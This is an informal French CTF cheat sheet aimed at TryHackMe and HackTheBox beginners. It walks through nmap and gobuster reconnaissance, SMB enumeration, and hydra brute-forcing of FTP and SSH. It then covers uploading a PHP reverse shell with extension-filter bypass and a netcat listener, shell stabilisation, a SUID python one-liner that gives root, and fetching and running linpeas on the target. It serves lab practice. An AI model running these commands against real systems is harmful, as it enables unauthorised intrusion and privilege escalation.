# 0 : pourquoi?
pour faire des ctf  alors ici on parle de easy,medium,hard de tryhackme et pas de ctf a 10k$ mais c'est la base les choses que tu vois tout le temp quand tu fais un ctf sur thm,hackthebox,etc




# 1. reconnaissance avec nmap

1.1 scan complet des ports

nmap -Pn -sC -sV -A -p- -oN recon.txt <ip>
-Pn : bypass ping

-sC : scripts par défaut (enamel, version, vuln…)

-sV : détection de version

-A : os + scripts + traceroute

-p- : scan 0–65535

exemple :


PORT     STATE SERVICE VERSION


21/tcp   open  ftp     vsftpd 3.0.3


22/tcp   open  ssh     OpenSSH 7.6p1 Debian


80/tcp   open  http    Apache 2.4.29


445/tcp  open  smb     Samba smbd 4.7.6

 on note les ports ouverts

on note chaque version et les services pour une potentielle analyse de vuln sur exploit db ou searchsploit

# 2. bruteforce de répertoires avec gobuster

gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -o gobuster.txt

gobuster = outil, -u pour specifier l'url, -w pour specifier la liste de mots -t pour les threads et -o pour output = enregistrer les results dans un fichier

options importantes : -x txt,php = si cette option est choisi gobuster va enumerer seulement les fichiers avec l'extension precisée


# 3. enumeration SMB via enum4linux


enum4linux -a <ip> | tee enum4linux.txt

-a = tout : utilisateurs, partages, politiques, info OS

sortie normale : 

Users:
   user1
   user2
Shares:
   Anonymous
   pics
   IPC$

permet de repérer des partages accessibles (anonymes ou non)

note les utilisateurs listés

# 4. accès FTP anonyme ou authentifié

4.1 ftp anonyme

ftp <ip>
Connected to...
Name (ip:user): anonymous
si ca demande un mdp,pareil pour ssh je crois,on met juste entrer(si cen anonymous)
si ca marche,recupere le max de fichier important!
si    le login anonymous ne marche pas ...

# 4.2 authentification

si ftp demande login/mot de passe

on peux lancer hydra -l user -P wordlist ftp://<ip>

# 5. connexion SSH

si on trouves des identifiants (ex. via bruteforce, dump)

ssh user@<ip>

pour bruteforce :

hydra -L users.txt -P rockyou.txt ssh://<ip>
si ca passe bah on se co et on essaye de privesc

# 6. upload web + reverse shell

contexte : on trouve un upload ou un panel d'upload de fichiers,on pense donc a un rvshell en php,mais ca ne fonctionne pas pouir une raison ou une autre,on essaye de coutourner cela en changeant l'extension du fichier


# 6.1 bypass de filtre
teste .php, .phtml, .php3, .php5 via Burp ou manuel.

# 6.2 préparation du payload

on a un reverse shell en php d'installé sur notre machine,par ex : php-reverse-shell.php

on le modifie en : php-reverse-shell.phtml ou une autre extension de php

# 6.3 listener et upload

nc -lvnp 2121 (2121 est le port sur lequel j'ecoute)

upload avec form dans /uploads/…

accès via navigateur : http://<ip>/uploads/shell.phtml

reçoit shell en www-data, apache, etc.

# 7. stabilisation du shell

python3 -c 'import pty; pty.spawn("/bin/bash")'


export TERM=xterm


ctrl+z


stty raw -echo; fg

pty.spawn → interactive shell

TERM=xterm → flèches/autocomplétion

stty raw -echo; fg → remise du terminal

# 8. steg et analyse de fichiers telechargés

outils utiles :
steghide, binwalk, zsteg, exiftool

ex : 

steghide extract -sf image.jpg
zsteg image.png

# 9. post‑exploitation & enumeration

commandes utiles :

whoami (qui suis-je)
id
hostname
uname -a
ls /home /var/www$

repère le flag utilisateur(si ICI) souvent user.txt

exécute :


find / -perm /4000 -type f 2>/dev/null

note les fichiers avec bit SUID inattendus (ex. /usr/bin/python)

# 10. élévation de privileges

10.1 python SUID

/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

si py = suid : retour root

ah et aussi plus simple,utiliser linpeas.sh

# HM : linpeas

en gros linpeas va automatiquement chercher des paths avec des privligeges elevés,a noter que dans les ctf,c'est souvent python

alors on telecharge linpeas depusi github ou peu importe

on fait un serveur avec python3

puis sur la machien cible on fait un wget sur notre fichier linpêas pour le telecharger

puis en le rend executable

chmod +x linpeas.sh

et on l'execute

./linpeas.sh







